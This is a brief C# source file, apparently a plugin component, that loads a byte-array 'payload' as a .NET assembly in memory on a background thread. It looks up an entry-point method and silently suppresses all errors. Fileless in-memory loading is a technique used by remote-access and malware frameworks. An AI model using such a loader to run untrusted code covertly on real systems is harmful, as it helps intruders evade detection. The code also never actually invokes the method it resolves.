using Microsoft.VisualBasic;
using System.Threading;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    internal static class ManagedDll
    {
        internal static bool LoadDll(byte[] payload, string etp) 
        {
            Thread thread = new Thread(() => 
            {
                try
                {
                    string[] s = Strings.Split(etp, ".");
                    System.Reflection.Assembly assemblytoload = System.Reflection.Assembly.Load(payload);
                    System.Reflection.MethodInfo method = null;
                    method = assemblytoload.GetType(s[0] + "." + s[1]).GetMethod(s[2]);
                    object obj = assemblytoload.CreateInstance(method.Name);
                }
                catch {}

            });
            thread.Start();

            if (thread.IsAlive)
                return true;
            return false;
        }
    }
}
